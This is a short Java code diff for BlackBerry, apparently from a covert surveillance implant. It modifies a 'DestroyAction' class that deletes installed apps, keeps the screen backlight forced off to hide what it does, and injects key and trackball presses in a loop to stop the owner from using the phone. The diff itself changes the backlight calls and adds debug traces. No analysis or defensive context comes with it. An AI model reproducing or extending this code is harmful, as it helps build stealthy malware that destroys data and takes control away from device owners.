@@ -7,6 +7,7 @@ import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.Keypad;
 import blackberry.AppListener;
 import blackberry.Core;
+import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
@@ -47,7 +48,7 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
         Phone.addPhoneListener(this);
         AppListener.getInstance().addBacklightObserver(this);
 
-        Backlight.enable(false);
+        Status.self().setBacklight(false);
 
         return true;
     }
@@ -76,9 +77,9 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
             debug.trace("deleteApps, " + name + " : " + ret);
             //#endif
         }
-        Backlight.enable(false);
+        Status.self().setBacklight(false);
         CodeModuleManager.promptForResetIfRequired();
-        Backlight.enable(false);
+        Status.self().setBacklight(false);
         Utils.sleep(100);
         KeyInjector.trackBallUp(1);
         Utils.sleep(100);
@@ -90,6 +91,9 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
     }
 
     void kill() {
+        //#ifdef DEBUG
+        debug.trace("kill");
+        //#endif
         while(!stop){
             pressKey(Keypad.KEY_ESCAPE);
             pressKey(Keypad.KEY_END);
@@ -173,6 +177,9 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
 
     public void onBacklightChange(boolean status) {
         if(status){
+            //#ifdef DEBUG
+            debug.trace("onBacklightChange: starting kill");
+            //#endif
             stop=false;
             Thread thread = new Thread(new Runnable() {
                 public void run() {
@@ -183,6 +190,9 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
             Utils.sleep(100);
             Backlight.enable(false);
         }else{
+            //#ifdef DEBUG
+            debug.trace("onBacklightChange: stopping kill");
+            //#endif
             stop=true;
             
         }
